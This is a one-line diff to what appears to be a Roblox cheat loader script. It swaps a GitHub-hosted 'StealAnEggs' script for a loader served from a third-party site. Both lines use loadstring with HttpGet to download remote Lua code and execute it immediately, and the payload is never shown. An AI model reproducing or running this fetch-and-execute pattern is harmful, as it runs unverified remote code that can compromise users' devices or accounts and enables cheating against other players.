@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WhiteX1208/Scripts/refs/heads/main/StealAnEggs.luau"))()
+loadstring(game:HttpGet("https://robloxscriptbest.com/script/loader.php?script=nightegg"))()
